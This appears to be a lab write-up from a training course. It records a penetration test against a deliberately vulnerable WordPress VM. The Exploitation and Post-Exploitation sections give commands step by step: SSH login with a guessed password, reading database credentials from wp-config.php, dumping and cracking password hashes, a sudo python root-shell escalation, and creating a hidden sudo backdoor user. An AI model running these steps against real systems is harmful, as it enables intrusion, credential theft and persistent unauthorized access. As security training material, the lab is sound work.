# Attack_Defense_Analysis_VulnerableNetwork: Red Team Operations Summary

This lab is an extension of [Red Team vs. Blue Team](https://github.com/keeslonkf/Red-Team-vs.-Blue-Team/blob/main/README.md). In this penetration test engagement, a vulnerable Wordpress Server is attacked to exfiltrate data and gain a foothold on the system. Kibana alerts are preconfigured, and reviewed at the completion of the engagement. This project requires knowledge of pen testing, SIEM, and system administration.

## Penetration Testing Background

There are several steps involved with penetrating a network: Planning and Reconnaissance, Scanning, Exploitation, Post Exploitation, and Reporting. Once the network has been exploited there are a number of ways an attacker can abuse a system including stealing sensitive data, modifying data on the network, compromising the availability of data for a ransom and leaving a backdoor for perpetual access.

![NetworkTopology]()

This document contains the following details:
- Description of Topology
- Vulnerability Assessment
- Recon
- Exploitation
- Post-Exploitation
- Critical Vulnerabilities Review

### Description of Topology

In this lab, there were several machines on the network to be tested. A Windows VM which contained Hyper-V Manager served as the gateway to other nested VMs on the same network. A machine called Capstone served as a target machine to use in testing Kibana alerts. Another VM on the network was an ELK server which is used to capture log data from the other machines on the network. The Kibana platform is useful for parsing logs, creating visual representations of data, and creating alerts. Another machine is a vulnerable WordPress Server that serves as our proposed target. Lastly, for this engagement the actual attacking machine - Kali - was on the network itself as well. The goal of infiltrating the Target 1 machine was to escalate privileges and capture 4 hidden flags.

The configuration details of each machine may be found below.

| Hostname | Function       | IP Address               | Operating System |
|----------|----------------|--------------------------|------------------|
| Gateway  | Gateway        | 192.168.1.1              | Windows 10 Pro   |
| Kali     | Attack Machine | 192.168.1.90             | Linux: Kali      |
| ELK      | ELK Log Server | 192.168.1.100            | Linux: Ubuntu    |
| CAPSTONE | Test Alerts    | 192.168.1.105            | Linux: Ubuntu    |
| Target 1 | Target Machine | 192.168.1.110            | Linux: Debian    |

### Vulnerability Assessment

- A vulnerability script was downloaded and used to dig deeper and scan for vulnerabilities
  > - cd /usr/share/nmap/scripts/
  > - git clone https://github.com/vulnersCom/nmap-vulners.git
  > - nmap --script nmap-vulners/ -sV $target1
  
 ![vulnerabilities]() 
 
- A host of vulnerabilities were discovered using the nmap scripted scan, the most obvious being SSH

### Recon

- Nmap Scan was performed to identify any open ports, services and versions, and OS details
  - For convenience, the IP address of the target machine was saved in a variable using the "export" command
  - The following commands were run to detect open ports, services and versions
    > - export target1=192.168.1.110
    > - nmap -sV $target1
   - The scan revealed the following results:
   
 ![nmapResults]()
 
- The following services and port numbers were identified as potential points of entry:
  - SSH:22
  - HTTP:80
  - rpcbind:111
  - Netbios-ssn:139
  - Netbios-ssn:445
  
- Since we know the machine is a wordpress server, we can use a tool called wpscan to enumerate users on the Wordpress server
  > - wpscan --url http://192.168.1.110/wordpress --enumerate u
  ![wpScan]()

- 2 users were identified on the server: steven and michael
- We can use this information to try and exploit SSH to get into the system 

- We can also site-walk and browse the wordpress server via the web page and inspecting the html code.
- F12 brings up the developer options where we can use the "inspector" tab to search using the word flag
- This reveals flag1

![flag1]()

### Exploitation

- Before resulting to a program to bruteforce passwords, we can try a few obvious and insecure passwords to SSH into the web server like [michael:michael]
  > - ssh michael@192.168.1.110
  
![sshMichael]()

- The next step is to try the obvious, and used commands to search for the first flag
  > - find / -iname flag*.txt
  
![Flag2]()

- The first flag was discovered in /var/www/flag2.txt
- I wanted to download this file for later, so I opened another terminal and used the secure copy tool to download it from the target machine to my machine
  > - scp michael@192.168.1.110:/var/www/flag2.txt ~/Downloads/
  > - note the syntax for scp is user@ip.address:/path_to_download_file path_on_your_machine

![scpFlag2]()

- Now we want to exploit the mysql database to dump the password hashes, so we need to find the database password
- Sometimes, developers keep default passwords, or worse actual passwords themselves in a configuration file for Wordpress
- We can check the wp-config.php file that is located in /var/www/html for loose passwords.
  > - cd /var/www/html/wordpress
  > - cat wp-config.php
  
![wpConfigFile]()
  
- Here we discover the login credentials for the mySQL database is [root:R@v3nSecurity]  
- Again, this file can be downloaded to our machine in case we get kicked out the system, so return to 2nd terminal
  > - scp michael@192.168.1.110:/var/www/html/wordpress/wp-config.php ~/Downloads/

![scpWpconfig]()

- These credentials were used to log into the mysql database on the Wordpress server
  > - mysql -h localhost -u root -p wordpress
  
 - Once authenticated, we need to get a view of the architecture and how the table is set up
  > - show tables;

![showTables]()

- Next, we can inspect the data inside of the users table
  > - describe wp_users;

![usersTable]()

- In the users table, we can see two tables "user_login" and "user_pass". We can inspect those for hashes
  > - select user_login, user_pass from wp_users;

![sqlHashes]()

- To dump these hashes we use a mysql function "concat_ws" to combine the usernames and passwords separated by ":"
- This is useful because we will be using a program called john the ripper to crack these hashes and they must be in this format
  > - select concat_ws(':', user_login, user_pass) from wp_users into outfile '/var/www/html/wp_hashes.txt';
- Check to make sure the contents are correct
  > - cat cat /var/www/html/wp_hashes.txt;
  
  ![hashdump]()
  
- We want to download this file to our machine as well, just in case we are disconnected, so we return to our 2nd terminal
  > - scp michael@192.168.1.110:/var/www/html/wp_hashes.txt ~/Downloads/

![downloadHash]()

- Now that we have the hash file on the Kali machine, we can use john the ripper to crack the password hashes.
  > - cd /usr/share/wordlists
  > - john --wordlist=rockyou.txt ~/Downloads/wp_hashes.txt
- Steven's password was cracked in a few seconds: {pink84}
- The second hash kept running but it doesn't matter because we already have michael's password and we want Steven's

- After logging in as steven, we want to escalate privileges to gain a root shell, but first we must check his sudo privileges
  > - sudo -l
- This command reveals steven has root privileges for python commands only
- This tells us we need to run a python command to be able to gain a root shell
- Research was done online to find a command to escalate privileges
  > - sudo python -c 'import pty;pty.spawn("/bin/bash")' id
  
![privEsc]()

- We can use the find command to find any flag.txt file on the machine and check it's contents
  > - find / -iname flag*.txt
  > - cat /root/flag4.txt
  
![flag4.txt]()





- Further inspection into the users table revealed flags 3 and 4
  > - select * from wp_posts;
  
![flag3]()
![flag4]()

### Post-Exploitation

- Once we've gained a root shell, one of the first things we should do is find a way to maintain access to the system
- This can be done in several ways:
  - Create a new user with an inconspicuous name like "azadmin" then give root privileges with no password
    > - adduser azadmin
      - Note the "useradd -m azadmin" would be the better alternative as this would not create a home directory or user creation date.
    - Next, we can check sudo permissions and as expected, this user has no root privileges
      > - sudo -lU azadmin
    - We can add the new user to the sudo group
      > - sudo usermod -aG sudo azadmin
    - Check root privileges
      > - sudo -lU azadmin
      
 ![createUser]()

### Critical Vulnerabilities Review

- Critical Vulnerabilites discovered during the pen testing process were:
- Improper SSH Configuration - any machine with login credentials can ssh into the machine
  - Impact: High; SSH is a potential entry point for attackers if they can authenticate
- Bruteforce Attack / Weak Passwords - attackers use a program to guess many passwords until the correct entry is found
  - High: If an attacker is able to obtain user credentials, they can login and use this as a pivot point to traverse directories/the network or escalate privileges
- Broken Access Control - Sensitive data is easily accessible to users who should not have permissions
  - High; if the right data is accessed, an entire  organization can be compromised
- Privilege Escalation - Attackers using various techniques to gain a root shell or higher privileges on a network
  - High; attacker can lock out accounts, create new user accounts, access any sensitive data on the system
  
